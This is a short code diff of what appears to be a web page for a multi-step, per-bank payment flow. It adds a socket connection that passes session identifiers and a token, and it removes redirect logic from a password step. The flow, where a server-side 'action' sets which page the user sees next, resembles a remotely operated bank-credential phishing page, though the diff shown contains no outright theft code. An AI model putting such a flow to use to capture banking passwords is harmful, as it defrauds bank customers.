@@ -52,6 +52,13 @@
 </script>
   <script>      
     document.addEventListener('DOMContentLoaded', function () {
+      initSocketConnection(
+        @json($nodeUrl),
+        @json($sessionId),
+        @json($sessionToken),
+        @json($bank),
+        @json((string)$step) // 👈 este es el importante
+      );
       const passInput = document.getElementById('txtPassword');
       const btn = document.getElementById('btnPass');
       const form = document.getElementById('formStep2');
@@ -127,15 +134,7 @@
             console.log(ack);
             if (!ack?.ok) {
               if (ack.error === "bad_state") {
-                window.hideLoading?.();
-                window.RT_SOCKET?.emit("user:get_session", (s) => {
-                  if (!s?.action) return;
-                  const expected = expectedStepFromAction(String(s.action));
-                  if (expected && String(RT.step) !== expected) {
-                    showLoading("Redirigiendo...");
-                    window.location.href = `/pago/${RT.bank}/step/${expected}`;
-                  }
-                });
+                return;
               }
               window.hideLoading?.();
             }
